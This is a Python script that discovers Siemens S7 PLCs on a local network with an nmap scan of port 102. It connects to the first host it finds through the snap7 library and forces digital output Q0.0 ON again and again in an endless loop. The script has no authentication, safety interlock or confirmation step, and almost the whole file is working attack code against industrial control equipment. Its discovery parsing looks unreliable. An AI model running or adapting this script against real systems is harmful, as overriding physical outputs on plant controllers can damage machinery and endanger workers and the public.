import snap7
import socket
import struct
import time
import subprocess

# Configuration - Adapt these to your environment
PLC_IP = None  # IP address of the PLC (initially None, will be discovered)
PLC_RACK = 0    # PLC Rack number
PLC_SLOT = 1    # PLC Slot number
DB_NUMBER = 1    # Data Block number to manipulate (adjust as needed)
DB_START = 0     # Starting byte in the Data Block (adjust as needed)
DB_SIZE = 2      # Number of bytes to write (adjust as needed) - Forcing 1 output for this case 
TARGET_OUTPUT = "Q0.0" # Example target output
FORCE_VALUE = 1    # Value to force on the output (0 for OFF, 1 for ON)
SCAN_INTERVAL = 1  # Number of seconds between scans

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address using nmap.

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    try:
        # Replace '192.168.1.0/24' with your network range if needed.  
        # Adjust the nmap command as needed for your network.
        result = subprocess.run(['nmap', '-p', '102', '-T4', '192.168.1.0/24'], capture_output=True, text=True)  #Siemens uses Port 102
        output = result.stdout

        # Parse the nmap output for the PLC's IP.  This is highly dependent on nmap's output format.
        for line in output.splitlines():
            if "Host is up" in line and "for" in line: # Adjust the scan parameter if necessary. For example, 102 as a port means it is a Siemens PLC
                ip_address = line.split('(')[1].split(')')[0]
                print(f"Found PLC IP address: {ip_address}")
                return ip_address
        print("Could not discover the PLC's IP address using nmap.")
        return None

    except Exception as e:
        print(f"Error discovering PLC IP address: {e}")
        return None


def iec_address_to_bytes(address: str):
    """Converts an IEC address (e.g., 'Q0.0') to byte, bit, and area codes."""
    area = address[0]
    byte = int(address[1:].split('.')[0])
    bit = int(address[1:].split('.')[1])
    area_code = 0x82 if area == 'Q' else 0x81 if area == 'I' else 0x83 if area == 'M' else -1
    return area_code, byte, bit


def force_output(client, target_output, force_value):
    """
    Forces a digital output to a specific value using S7 protocol.

    Args:
        client: The Snap7 client object.
        target_output (str): The IEC address of the output (e.g., "Q0.0").
        force_value (int): 0 or 1 to force the output OFF or ON, respectively.
    """
    try:
        area_code, byte, bit = iec_address_to_bytes(target_output)

        if area_code == -1:
            print(f"Invalid output address format: {target_output}")
            return

        # Read the current byte value
        read_data = client.read_area(area_code, 0, byte, 1)  # Area Code, DB Number (ignored for I/O), Start Byte, Size (1 byte)

        # Modify the bit
        current_byte = read_data[0]
        if force_value == 1:
            new_byte = current_byte | (1 << bit)  # Set bit to 1
        else:
            new_byte = current_byte & ~(1 << bit) # Set bit to 0

        # Write the modified byte back
        write_data = bytearray([new_byte])
        client.write_area(area_code, 0, byte, write_data)  # Area Code, DB Number (ignored for I/O), Start Byte, Data to Write
        print(f"Successfully forced output {target_output} to {force_value}")
    except Exception as e:
        print(f"Error forcing output {target_output}: {e}")


def main():
    global PLC_IP
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("PLC IP address not found.  Exiting.")
            return

    client = snap7.client.Client()
    try:
        client.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        while True:
             force_output(client, TARGET_OUTPUT, FORCE_VALUE) # Force the output on
             time.sleep(SCAN_INTERVAL) # Wait

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if client.get_connected():
            client.disconnect()
            print("Disconnected from PLC.")

if __name__ == "__main__":
    main()